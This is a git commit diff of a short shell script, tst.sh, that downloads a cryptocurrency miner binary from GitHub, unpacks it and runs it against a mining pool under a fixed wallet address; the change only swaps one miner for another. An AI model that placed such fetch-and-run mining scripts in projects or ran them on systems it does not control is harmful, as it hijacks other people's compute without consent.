28cbe41ddc33d718737e3e393aa9ef8e221ec326
fahdin1510 <84253293+fahdin1510@users.noreply.github.com>
2021-05-17 07:41:13 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -1,4 +1,4 @@
 sudo apt update
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://verushash.mine.zergpool.com:3300 -u 0xc76501e729406b3a93ae6fa0975df0546acf6a92.tstt --cpu 6
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tgz
+./nheqminer -v -l stratum+tcp://verushash.mine.zergpool.com:3300 -u 0xc76501e729406b3a93ae6fa0975df0546acf6a92.tstt --cpu 6
